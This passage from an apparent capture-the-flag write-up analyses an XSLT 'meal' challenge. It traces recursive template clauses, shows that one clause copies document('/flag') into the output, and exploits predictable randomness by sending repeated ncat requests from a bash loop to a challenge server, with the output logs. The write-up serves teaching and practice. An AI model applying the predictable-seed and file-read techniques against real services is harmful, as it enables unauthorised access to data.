class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meal</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">course</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plate</span>&gt;</span></span><br><span class="line">                    1st plate</span><br><span class="line"><span class="tag">&lt;/<span class="name">plate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plate</span>&gt;</span></span><br><span class="line">                    2nd plate</span><br><span class="line"><span class="tag">&lt;/<span class="name">plate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">course</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">state</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">drinks</span>&gt;</span>1<span class="tag">&lt;/<span class="name">drinks</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">drinks</span>&gt;</span>2<span class="tag">&lt;/<span class="name">drinks</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">state</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">meal</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>And now finally analysing the “function” <strong>consume-meal</strong>:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">name</span>=<span class="string">"consume-meal"</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">xsl:param</span> <span class="attr">name</span>=<span class="string">"chef-drinks"</span>/&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">xsl:param</span> <span class="attr">name</span>=<span class="string">"food-eaten"</span>/&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">xsl:param</span> <span class="attr">name</span>=<span class="string">"course"</span>/&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">xsl:param</span> <span class="attr">name</span>=<span class="string">"drinks"</span>/&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">xsl:if</span> <span class="attr">test</span>=<span class="string">"$food-eaten &gt; 30000"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:message</span> <span class="attr">terminate</span>=<span class="string">"yes"</span>&gt;</span>You ate too much and died<span class="tag">&lt;/<span class="name">xsl:message</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">xsl:if</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">xsl:if</span> <span class="attr">test</span>=<span class="string">"count($drinks) &gt; 200"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:message</span> <span class="attr">terminate</span>=<span class="string">"yes"</span>&gt;</span>You cannot drink that much<span class="tag">&lt;/<span class="name">xsl:message</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">xsl:if</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Right at the beginning the parameters of the “function” are being declared, and two <strong>ifs</strong> are checking if we ate more than 30k plates or more than 200 drinks, so if we eat of drink more than that , the function terminates and “prints” a message to the user.</p><p>After this we come up with a new <strong>if</strong>, it checks if the number of plates is higher than 0, and a new tag <strong><a href="xsl:choose" target="_blank" rel="noopener">xsl:choose</a></strong>, which is like a <strong>switch-case</strong> from the c language the <strong>when</strong> tags are the case clauses, and it only enters it if the condition is true of course. Right before the <strong>choose</strong> two variables are being initialized, <strong>c</strong> and <strong>r</strong> , the variable <strong>c</strong> will get the head (first element) of the plate list inside the tag course, and <strong>r</strong> will be setted into the <strong>rest</strong> plates of the list, <strong>position()&gt;1</strong> will select all the plates above the position 1.</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xsl:if</span> <span class="attr">test</span>=<span class="string">"count($course) &gt; 0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">"c"</span> <span class="attr">select</span>=<span class="string">"$course[1]"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">"r"</span> <span class="attr">select</span>=<span class="string">"$course[position()&gt;1]"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:choose</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:when</span> <span class="attr">test</span>=<span class="string">"count($c/宫保鸡丁) = 1"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">xsl:message</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">chef-drinks</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">xsl:copy-of</span> <span class="attr">select</span>=<span class="string">"$chef-drinks"</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">chef-drinks</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">xsl:message</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">xsl:message</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">drinks</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">xsl:copy-of</span> <span class="attr">select</span>=<span class="string">"$drinks"</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">drinks</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">xsl:message</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">xsl:call-template</span> <span class="attr">name</span>=<span class="string">"consume-meal"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">xsl:with-param</span> <span class="attr">name</span>=<span class="string">"chef-drinks"</span> <span class="attr">select</span>=<span class="string">"$chef-drinks"</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">xsl:with-param</span> <span class="attr">name</span>=<span class="string">"food-eaten"</span> <span class="attr">select</span>=<span class="string">"$food-eaten + 1"</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">xsl:with-param</span> <span class="attr">name</span>=<span class="string">"course"</span> <span class="attr">select</span>=<span class="string">"$r"</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">xsl:with-param</span> <span class="attr">name</span>=<span class="string">"drinks"</span> <span class="attr">select</span>=<span class="string">"$drinks"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">xsl:call-template</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">xsl:when</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:when</span> <span class="attr">test</span>=<span class="string">"count($c/paella) = 1"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">"newdrinks"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"$c/paella + 0"</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">xsl:copy-of</span> <span class="attr">select</span>=<span class="string">"$drinks"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">xsl:variable</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">xsl:call-template</span> <span class="attr">name</span>=<span class="string">"consume-meal"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">xsl:with-param</span> <span class="attr">name</span>=<span class="string">"chef-drinks"</span> <span class="attr">select</span>=<span class="string">"$chef-drinks"</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">xsl:with-param</span> <span class="attr">name</span>=<span class="string">"food-eaten"</span> <span class="attr">select</span>=<span class="string">"$food-eaten + 1"</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">xsl:with-param</span> <span class="attr">name</span>=<span class="string">"course"</span> <span class="attr">select</span>=<span class="string">"$r"</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">xsl:with-param</span> <span class="attr">name</span>=<span class="string">"drinks"</span> <span class="attr">select</span>=<span class="string">"exsl:node-set($newdrinks)//value"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">xsl:call-template</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">xsl:when</span>&gt;</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="Clause-Analysis"><a href="#Clause-Analysis" class="headerlink" title="Clause Analysis"></a>Clause Analysis</h3><p>I will only explain 3 clauses, since my solution only uses 3 it makes sense to only explain these ones.</p><p>Analysing the first <strong>case-clause</strong>:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xsl:when</span> <span class="attr">test</span>=<span class="string">"count($c/宫保鸡丁) = 1"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>We can already update out XML into this, since <strong>$c</strong> is a plate we will need a new <strong>tag</strong> which are named into this weird names, if we want to enter into this clause:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meal</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">course</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">宫保鸡丁</span>&gt;</span>4<span class="tag">&lt;/<span class="name">宫保鸡丁</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">course</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">state</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">drinks</span>&gt;</span></span><br><span class="line">        1</span><br><span class="line">       <span class="tag">&lt;/<span class="name">drinks</span>&gt;</span></span><br><span class="line"></span><br><span class="line">       <span class="tag">&lt;<span class="name">drinks</span>&gt;</span></span><br><span class="line">        1</span><br><span class="line">       <span class="tag">&lt;/<span class="name">drinks</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">state</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">meal</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Now analysing the code when we enter this clause 宫保鸡丁 , as we can see below it only prints the current <strong>chef drinks</strong> and the current <strong>drinks</strong>, in the end is recalling <strong>consume-meal</strong>, this will form a recursive function that will iterate all the plates created in the <strong>course</strong> tag, as we can see the parameters passed the only thing that changes is the <strong>$course</strong> the <strong>$r</strong> is passed into this parameter so we don’t get stuck in a infinite loop which is the usually the thing you do when creating a recursive function, oh the other change is obvious the incrementing of the variable <strong>food-eaten</strong>.</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xsl:when</span> <span class="attr">test</span>=<span class="string">"count($c/宫保鸡丁) = 1"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:message</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">chef-drinks</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">xsl:copy-of</span> <span class="attr">select</span>=<span class="string">"$chef-drinks"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">chef-drinks</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">xsl:message</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:message</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">drinks</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">xsl:copy-of</span> <span class="attr">select</span>=<span class="string">"$drinks"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">drinks</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">xsl:message</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:call-template</span> <span class="attr">name</span>=<span class="string">"consume-meal"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:with-param</span> <span class="attr">name</span>=<span class="string">"chef-drinks"</span> <span class="attr">select</span>=<span class="string">"$chef-drinks"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:with-param</span> <span class="attr">name</span>=<span class="string">"food-eaten"</span> <span class="attr">select</span>=<span class="string">"$food-eaten + 1"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:with-param</span> <span class="attr">name</span>=<span class="string">"course"</span> <span class="attr">select</span>=<span class="string">"$r"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:with-param</span> <span class="attr">name</span>=<span class="string">"drinks"</span> <span class="attr">select</span>=<span class="string">"$drinks"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">xsl:call-template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:when</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Analysing the second <strong>case-clause</strong>:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xsl:when</span> <span class="attr">test</span>=<span class="string">"count($c/दाल) = 1"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:if</span> <span class="attr">test</span>=<span class="string">"count($chef-drinks) = 0"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:copy-of</span> <span class="attr">select</span>=<span class="string">"document('/flag')"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">xsl:if</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:call-template</span> <span class="attr">name</span>=<span class="string">"consume-meal"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:with-param</span> <span class="attr">name</span>=<span class="string">"chef-drinks"</span> <span class="attr">select</span>=<span class="string">"$chef-drinks"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:with-param</span> <span class="attr">name</span>=<span class="string">"food-eaten"</span> <span class="attr">select</span>=<span class="string">"$food-eaten + 1"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:with-param</span> <span class="attr">name</span>=<span class="string">"course"</span> <span class="attr">select</span>=<span class="string">"$r"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:with-param</span> <span class="attr">name</span>=<span class="string">"drinks"</span> <span class="attr">select</span>=<span class="string">"$drinks"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">xsl:call-template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:when</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Now analysing the code when we enter this clause दाल, we can see it will print and select a document “/flag” which will contain the flag we need, perhaps we need satisfy the condition <strong>count($chef-drinks) = 0</strong>, the <strong>chef-drinks</strong> is initialized with 5 random numbers (chef-drinks) so we need to find a clause that removes items from <strong>$chef-drinks</strong> so we reach the count of 0.</p><p>Analysing the third <strong>case-clause</strong>:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xsl:when</span> <span class="attr">test</span>=<span class="string">"count($c/Борщ) = 1"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">"arg0"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"$drinks[1] + 0"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">xsl:variable</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:call-template</span> <span class="attr">name</span>=<span class="string">"consume-meal"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:with-param</span> <span class="attr">name</span>=<span class="string">"chef-drinks"</span> <span class="attr">select</span>=<span class="string">"$chef-drinks[position() &gt; 1 or $chef-drinks[1] != $arg0]"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:with-param</span> <span class="attr">name</span>=<span class="string">"food-eaten"</span> <span class="attr">select</span>=<span class="string">"$food-eaten + 1"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:with-param</span> <span class="attr">name</span>=<span class="string">"course"</span> <span class="attr">select</span>=<span class="string">"$r"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:with-param</span> <span class="attr">name</span>=<span class="string">"drinks"</span> <span class="attr">select</span>=<span class="string">"$drinks[position() &gt; 1]"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">xsl:call-template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:when</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Now analysing the code when we enter this clause Борщ, the first drink in $drinks (drinks declared inside the state tag) is setted into arg0 variable, now analysing the recalling parameters we can see <strong>chef-drinks</strong> is being modified:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xsl:with-param</span> <span class="attr">name</span>=<span class="string">"chef-drinks"</span> <span class="attr">select</span>=<span class="string">"$chef-drinks[position() &gt; 1 or $chef-drinks[1] != $arg0]"</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>The select will remove the <strong>head</strong> of <strong>$chef-drinks</strong> based on a condition <strong>position() &gt; 1 or $chef-drinks[1] != $arg0</strong>, so to make this condition work we need either for both condition to be both false, or to at least <strong>position() &gt; 1</strong> to be true, unfortunately <strong>position() &gt; 1</strong> will never be true in this situation because <strong>position()</strong> will return the current position order in xml and since it’s not associated into any tag it will always return 1 because is associated to the <strong>root element meal</strong>, <strong>1 &gt; 1</strong> is always false so we need to make <strong>$chef-drinks[1] != $arg0</strong> to return false as well, the <strong>$chef-drinks</strong> are declared as <strong>random</strong> in the begining but as I said before the randomness is implemented in a wrong way, if we do fast requests we can get the same numbers as we can analyse it here:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ ncat 35.246.237.11 1 &lt; solution.xml</span><br><span class="line">Reading input document from stdin...</span><br><span class="line">XSLT message: 2790719341256416733922614505473645015994193916258 (Occurred <span class="keyword">in</span> entity <span class="string">'file:///home/user/challenge.min.xslt'</span>, at line 1, column 1.)</span><br><span class="line">Source tree node: meal.</span><br><span class="line">XSLT message:  (Occurred <span class="keyword">in</span> entity <span class="string">'file:///home/user/challenge.min.xslt'</span>, at line 1, column 1.)</span><br><span class="line">Source tree node: meal.</span><br><span class="line">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span>?&gt;&lt;all/&gt;⏎                                                                          </span><br><span class="line"></span><br><span class="line">$ ncat 35.246.237.11 1 &lt; solution.xml</span><br><span class="line">Reading input document from stdin...</span><br><span class="line">XSLT message: 2790719341256416733922614505473645015994193916258 (Occurred <span class="keyword">in</span> entity <span class="string">'file:///home/user/challenge.min.xslt'</span>, at line 1, column 1.)</span><br><span class="line">Source tree node: meal.</span><br><span class="line">XSLT message:  (Occurred <span class="keyword">in</span> entity <span class="string">'file:///home/user/challenge.min.xslt'</span>, at line 1, column 1.)</span><br><span class="line">Source tree node: meal.</span><br><span class="line">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span>?&gt;&lt;all/&gt;</span><br></pre></td></tr></table></figure><p>The only <strong>case-clause</strong> that prints the $chef-drinks for us is <strong>宫保鸡丁</strong> , so the xml used to print the samples above was:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meal</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">course</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">宫保鸡丁</span>&gt;</span>4<span class="tag">&lt;/<span class="name">宫保鸡丁</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">course</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">state</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">state</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">meal</span>&gt;</span></span><br></pre></td></tr></table></figure><p>But we ran into a problem here right? as you can see it prints <strong>chef-drinks</strong> into a single number, <strong>2790719341256416733922614505473645015994193916258</strong>, it looks like the message printing is joining all the 5 elements into a one number, for example if the random numbers were <strong>1,2,3,4,5</strong> the number that would be printed is <strong>12345</strong> , the problem is sometimes each drink will have a different length and we don’t have any way to tell which length each element has, so I decided to analyse a lot of occurrences.</p><p>To make sure the length of each <strong>$chef-drink</strong> I decided to modify a little bit the <strong>challenge.min.xslt</strong> file in my docker container so I could print those numbers as well, so right after the declared parameters in <strong>consume-meal</strong> I added this line:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xsl:copy-of</span> <span class="attr">select</span>=<span class="string">"$chef-drinks"</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>So at every iteration of <strong>consumer-meals</strong> the <strong>$chef-drinks</strong> will be printed like this:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ ncat localhost 1337 &lt; solution.xml</span><br><span class="line">Reading input document from stdin...</span><br><span class="line">XSLT message: 993763458325537011481963110810288894381216985659 (Occurred <span class="keyword">in</span> entity <span class="string">'file:///home/user/challenge.min.xslt'</span>, at line 65, column 65.)</span><br><span class="line">Source tree node: meal.</span><br><span class="line">XSLT message:  (Occurred <span class="keyword">in</span> entity <span class="string">'file:///home/user/challenge.min.xslt'</span>, at line 70, column 70.)</span><br><span class="line">Source tree node: meal.</span><br><span class="line">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span>?&gt;&lt;all&gt;&lt;value&gt;993763458&lt;/value&gt;&lt;value&gt;3255370114&lt;/value&gt;&lt;value&gt;819631108&lt;/value&gt;&lt;value&gt;1028889438&lt;/value&gt;&lt;value&gt;1216985659&lt;/value&gt;&lt;value&gt;993763458&lt;/value&gt;&lt;value&gt;3255370114&lt;/value&gt;&lt;value&gt;819631108&lt;/value&gt;&lt;value&gt;1028889438&lt;/value&gt;&lt;value&gt;1216985659&lt;/value&gt;&lt;/all&gt;</span><br></pre></td></tr></table></figure><p>So after this I did this bash script:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##35.246.237.11 1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> &#123;1..1000&#125;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">var1=$(ncat localhost 1337 &lt; solution.xml | grep -Poh <span class="string">'\d&#123;4,&#125;'</span>)</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$var1</span>;</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure></p><p>Running it into a file:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ bash rofl.sh &gt; out</span><br></pre></td></tr></table></figure><p>So after saving the outputs into a file I got something like this:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">1326253109254338424518246198631339281333178972257 1326253109 2543384245 182461986 3133928133 3178972257 1326253109 2543384245 182461986 3133928133 3178972257</span><br><span class="line">1326253109254338424518246198631339281333178972257 1326253109 2543384245 182461986 3133928133 3178972257 1326253109 2543384245 182461986 3133928133 3178972257</span><br><span class="line">1326253109254338424518246198631339281333178972257 1326253109 2543384245 182461986 3133928133 3178972257 1326253109 2543384245 182461986 3133928133 3178972257</span><br><span class="line">1326253109254338424518246198631339281333178972257 1326253109 2543384245 182461986 3133928133 3178972257 1326253109 2543384245 182461986 3133928133 3178972257</span><br><span class="line">1326253109254338424518246198631339281333178972257 1326253109 2543384245 182461986 3133928133 3178972257 1326253109 2543384245 182461986 3133928133 3178972257</span><br><span class="line">1326253109254338424518246198631339281333178972257 1326253109 2543384245 182461986 3133928133 3178972257 1326253109 2543384245 182461986 3133928133 3178972257</span><br><span class="line">1326253109254338424518246198631339281333178972257 1326253109 2543384245 182461986 3133928133 3178972257 1326253109 2543384245 182461986 3133928133 3178972257</span><br><span class="line">1326253109254338424518246198631339281333178972257 1326253109 2543384245 182461986 3133928133 3178972257 1326253109 2543384245 